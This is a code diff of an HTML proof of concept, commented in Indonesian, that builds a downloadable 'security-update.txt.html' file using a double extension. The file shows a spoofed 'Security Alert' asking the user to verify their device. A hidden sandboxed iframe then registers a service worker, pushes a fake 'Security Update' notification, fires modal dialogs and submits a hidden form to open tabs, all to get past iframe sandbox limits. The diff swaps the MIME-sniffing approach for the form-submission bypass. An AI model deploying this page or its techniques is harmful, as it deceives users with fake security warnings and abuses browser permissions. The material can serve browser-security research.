@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Chaining: MIME Sniffing + SW Sandbox Bypass</title>
+<title>Sandbox Bypass via Form + SW</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -20,8 +20,8 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>MIME Sniffing + SW Bypass</h2>
-<p>Mengunduh file .txt.html yang saat dibuka akan memicu Iframe Sandbox Bypass via Service Worker.</p>
+<h2>Sandbox Bypass via Form</h2>
+<p>Memicu form submission dari dalam iframe sandbox untuk membuka tab baru & memunculkan modals.</p>
 
 <button id="start-btn" type="button">Mulai Generate File</button>
 <div id="status" role="status">Sistem siap.</div>
@@ -34,19 +34,17 @@ const statusDiv = document.getElementById("status");
 const prepareMimeBlobAsync = (i) => {
     return new Promise((resolve) => {
         queueMicrotask(() => {
-            // Konten HTML yang akan dieksekusi (Payload)
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
             "<head><meta charset='UTF-8'><title>SYSTEM ALERT</title></head>" +
             "<body style='margin:0;padding:0;background:#0f111a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
             
-            // UI Spoofing
             "<div style='background:#1e2130;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:400px;text-align:center;border:1px solid #333;'>" +
             "    <h2 style='color:#ff4444;margin-bottom:10px;'>⚠️ Security Alert</h2>" +
             "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Kami mendeteksi aktivitas mencurigakan. Klik tombol di bawah untuk memverifikasi perangkat Anda.</p>" +
             
-            // Iframe Tersembunyi dengan Sandbox (Bypass Target)
-            "    <iframe id='sandboxFrame' sandbox='allow-same-origin allow-scripts' style='display:none;'></iframe>" +
+            // Iframe Tersembunyi
+            "    <iframe id='sandboxFrame' sandbox='allow-same-origin allow-scripts allow-forms' style='display:none;'></iframe>" +
             
             "    <button id='trigger-btn' style='background:#0078d4;color:#fff;border:none;padding:15px 30px;font-size:16px;font-weight:bold;border-radius:6px;cursor:pointer;width:100%;'>Verifikasi Sekarang</button>" +
             "    <p id='status' style='color:#ff9800;font-size:12px;margin-top:15px;'>Menunggu interaksi...</p>" +
@@ -56,15 +54,16 @@ const prepareMimeBlobAsync = (i) => {
             "(function(){" +
             "\"use strict\";" +
 
-            // Payload Iframe Sandbox
+            // KONTEN IFRAME: Form + SW + Modals
             "var iframeContent = `" +
             "    <!DOCTYPE html>" +
             "    <html>" +
             "    <body style='background:transparent;'>" +
+            // FORM UNTUK BYPASS POPUP
+            "        <form id='f' action='https://example.com' method='GET' target='_blank' style='display:none;'></form>" +
             "        <button id='show-notif-btn'>Trigger</button>" +
             "        <script>" +
             "            try {" +
-            // Daftarkan Service Worker (Pastikan file sw.js ada di root)
             "                navigator.serviceWorker.register('sw.js').then(function(reg) {" +
             "                    console.log('SW Registered:', reg);" +
             "                }).catch(function(err) { console.log('SW Error:', err); });" +
@@ -74,21 +73,22 @@ const prepareMimeBlobAsync = (i) => {
             "                Notification.requestPermission(function(result) {" +
             "                    if (result !== 'denied') {" +
             "                        navigator.serviceWorker.ready.then(function(registration) {" +
-            // Munculkan Notifikasi
             "                            registration.showNotification('Security Update', {" +
             "                                body: 'Klik untuk menyelesaikan verifikasi.'" +
             "                            });" +
 
-            // Uji Modals Bypass (Alert/Confirm/Prompt)
-            // Harusnya diblokir oleh sandbox, tapi jika muncul, berarti bypass berhasil.
+            // Modals Bypass
             "                            try {" +
             "                                alert('Thanks. alert');" +
             "                                console.log('Boom! console');" +
             "                                confirm('what; confirm');" +
             "                                prompt('oke; prompting');" +
-            "                            } catch(e) {" +
-            "                                console.log('Modals diblokir:', e.message);" +
-            "                            }" +
+            "                            } catch(e) { console.log('Modals blocked:', e.message); }" +
+
+            // FORM SUBMISSION BYPASS
+            "                            try {" +
+            "                                document.getElementById('f').submit();" +
+            "                            } catch(e) { console.log('Form blocked:', e.message); }" +
             "                        });" +
             "                    }" +
             "                });" +
@@ -98,21 +98,15 @@ const prepareMimeBlobAsync = (i) => {
             "    </html>" +
             "`;" +
 
-            // Menyuntikkan iframeContent ke dalam iframe
             "var frame = document.getElementById('sandboxFrame');" +
             "frame.srcdoc = iframeContent;" +
 
-            // Pemicu: Saat tombol di halaman utama diklik
             "document.getElementById('trigger-btn').addEventListener('click', function() {" +
             "    document.getElementById('status').textContent = 'Memproses bypass...';" +
-            
-            // Panggil fungsi di dalam iframe untuk memunculkan notif & modals
             "    try {" +
             "        var frameDoc = frame.contentDocument || frame.contentWindow.document;" +
             "        frameDoc.getElementById('show-notif-btn').click();" +
-            "    } catch(e) {" +
-            "        console.log('Iframe access error:', e);" +
-            "    }" +
+            "    } catch(e) { console.log(e); }" +
             "});" +
 
             "})();" +
@@ -130,7 +124,6 @@ const prepareMimeBlobAsync = (i) => {
 const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
-    // Ekstensi ganda MIME Sniffing
     link.download = `security-update-${fileData.id}.txt.html`;
     link.textContent = `Download security-update.txt.html`;
     link.style.display = "none";
